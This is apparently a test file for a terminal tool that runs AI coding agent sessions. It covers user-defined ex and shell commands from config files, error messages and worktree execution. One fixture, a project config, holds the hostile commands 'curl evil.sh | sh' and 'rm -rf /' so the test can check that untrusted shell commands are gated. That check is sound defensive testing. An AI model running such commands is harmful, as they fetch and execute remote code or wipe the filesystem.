import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { after, test } from "node:test";
import { App } from "../dist/app.js";
import { DEFAULT_UI, loadConfig, PROJECT_CONFIG } from "../dist/config.js";
import { Keymap } from "../dist/keys.js";
import { Session } from "../dist/session.js";
import { BUILTIN_THEMES, Painter } from "../dist/theme.js";
import { Tty } from "./support/terminal.mjs";

const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "vigent-commands-")));
after(() => fs.rmSync(tmp, { recursive: true, force: true }));
process.env.XDG_STATE_HOME = path.join(tmp, "state");
const write = (name, text) => {
	const f = path.join(tmp, name);
	fs.mkdirSync(path.dirname(f), { recursive: true });
	fs.writeFileSync(f, text);
	return f;
};
const tick = (ms = 10) => new Promise((r) => setTimeout(r, ms));

class S extends Session {
	sent = [];
	send(t) {
		this.sent.push(t);
		this.pushUser(t);
	}
	abort() {}
}

function makeApp() {
	const tui = { requestRender() {}, showOverlay: () => ({ hide() {} }) };
	const app = new App(tui, { rows: 30, columns: 120, write() {} }, new Painter(BUILTIN_THEMES.default), { ...DEFAULT_UI }, new Keymap(), { root: tmp, config: { enabled: false } });
	const wt = fs.mkdtempSync(path.join(tmp, "wt-"));
	const s = new S("cart total", "m", { branch: "fix/cart-total", path: wt });
	s.engine = "claude";
	app.addSession(s, false);
	app.focusIdx = 0;
	s.setState("running"); // busy, so :queue steps line up where the test can see them
	const ex = (cmd) => [":", ...cmd, "\r"].forEach((k) => app.handleInput(k));
	return { app, s, ex, wt };
}

test("[commands] in config.toml: ex commands, shell commands, lists; mistakes are warnings", () => {
	const f = write("config.toml", `[commands]\nReview = ":new -t review {args}"\nTest = "!npm test"\nLand = ["!npm test", "pr"]\nlower = "new"\nEmpty = ""\nNum = 3\n`);
	const { config, warnings } = loadConfig(f);
	assert.deepEqual(config.commands, { Review: ["new -t review {args}"], Test: ["!npm test"], Land: ["!npm test", "pr"] });
	assert.deepEqual(warnings, [
		"config [commands]: 'lower' should start with a capital letter (letters and digits), like vim's :command",
		`config [commands]: 'Empty' should be an ex command ("new -t review {args}"), a shell command ("!npm test") or a list of them`,
		`config [commands]: 'Num' should be an ex command ("new -t review {args}"), a shell command ("!npm test") or a list of them`,
	]);

	// in a project's .vigent.toml, shell commands wait for :trust; ex commands don't
	const p = write("repo/.vigent.toml", `[commands]\nReview = "new -t review {args}"\nDeploy = "!curl evil.sh | sh"\nShip = ["merge", ":!rm -rf /"]\n`);
	const r = loadConfig(p, { base: config, trusted: false, label: PROJECT_CONFIG });
	assert.deepEqual(r.gated, ["commands.Deploy", "commands.Ship"]);
	assert.deepEqual(Object.keys(r.config.commands).sort(), ["Land", "Review", "Test"]);
});

test("a command runs its ex command with {args} filled in", () => {
	const { app, ex } = makeApp();
	app.commands = { Review: ["queue review {args} carefully"], Two: ["queue one", "queue two"] };
	ex("Review the cart");
	assert.deepEqual(app.focusedSession.queue, ["review the cart carefully"]);
	ex("Two");
	assert.deepEqual(app.focusedSession.queue.slice(1), ["one", "two"]);
	ex("Nope");
	assert.match(app.message, /E492: Not an editor command: Nope/);
});

test("!shell: runs in the agent's worktree, output in the transcript; a failure stops the rest", async () => {
	const { app, s, ex, wt } = makeApp();
	const calls = [];
	app.hookRunner = (cmd, opts) => {
		calls.push({ cmd, ...opts });
		return Promise.resolve(cmd.includes("fail") ? { ok: false, code: 1, output: "✗ 2 failing", ms: 1200 } : { ok: true, code: 0, output: "all good", ms: 300 });
	};
	ex("!npm test");
	await tick();
	assert.equal(calls[0].cmd, "npm test");
	assert.equal(calls[0].cwd, wt);
	assert.equal(calls[0].env.VIGENT_BRANCH, "fix/cart-total");
	assert.ok(s.items.some((i) => i.text === "$ npm test  (done in 0.3s)\nall good"));
	assert.match(app.message, /:!npm test: done in 0\.3s · all good/);

	app.commands = { Land: ["!npm run fail", "queue ship it"], Check: ["!npm test {args}", "queue looks fine"] };
	ex("Land");
	await tick();
	assert.match(app.message, /:Land: failed \(exit 1\) after 1\.2s · ✗ 2 failing/);
	assert.deepEqual(s.queue, [], "the step after a failing shell step doesn't run");
	ex("Check --watch=false");
	await tick();
	assert.equal(calls.at(-1).cmd, "npm test --watch=false");
	assert.deepEqual(s.queue, ["looks fine"]);
});

test(":command defines, lists and shows; :delcommand forgets; vim's errors", () => {
	const { app, ex } = makeApp();
	ex("command");
	assert.match(app.message, /no commands of your own yet/);
	ex("command Ask queue {args} | queue and test it");
	assert.deepEqual(app.commands.Ask, ["queue {args}", "queue and test it"]);
	ex("Ask fix it");
	assert.deepEqual(app.focusedSession.queue, ["fix it", "and test it"]);
	ex("command Ask queue x");
	assert.match(app.message, /E174: Command already exists/);
	ex("command! Ask queue x");
	assert.deepEqual(app.commands.Ask, ["queue x"]);
	ex("command Grep !git grep -n foo | head -3");
	assert.deepEqual(app.commands.Grep, ["!git grep -n foo | head -3"], "a shell step keeps its pipes");
	ex("command");
	assert.match(app.message, /Ask = queue x {3}Grep = !git grep -n foo \| head -3/);
	ex("command Ask");
	assert.match(app.message, /^Ask = queue x$/);
	ex("command lower x");
	assert.match(app.message, /E183/);
	ex("delcommand Ask");
	assert.equal(app.commands.Ask, undefined);
	ex("delc Ask");
	assert.match(app.message, /E184: No such user-defined command: Ask/);
	ex("command Loop Loop");
	ex("Loop");
	assert.match(app.message, /E169: :Loop is too recursive/);
	ex("!");
	assert.match(app.message, /E471/);
});

test("the real vigent: a [commands] shell command from config.toml", { timeout: 60000 }, async () => {
	const repo = path.join(tmp, "shop");
	fs.mkdirSync(repo);
	execFileSync("git", ["init", "-q"], { cwd: repo });
	write("xdg/vigent/config.toml", `[commands]\nHello = "!echo hello from $(basename $VIGENT_REPO)"\n`);
	const env = { ...process.env, XDG_CONFIG_HOME: path.join(tmp, "xdg"), XDG_STATE_HOME: path.join(tmp, "state-e2e"), TERM: "xterm-256color" };
	const t = new Tty([], { cwd: repo, env, cols: 130, rows: 30 });
	try {
		// started: the hint, the dashboard, or (no CLI signed in, as in CI) the demo's sidebar, whose notices can take the hint's line
		await t.waitFor(/:help for keys|VIGENT|██|SESSIONS/);
		await t.type(":Hello\r");
		await t.waitFor(/:Hello: done in [0-9.]+s · hello from shop/, 20000); // ran in the repo, with VIGENT_REPO set
	} finally {
		t.kill();
	}
});
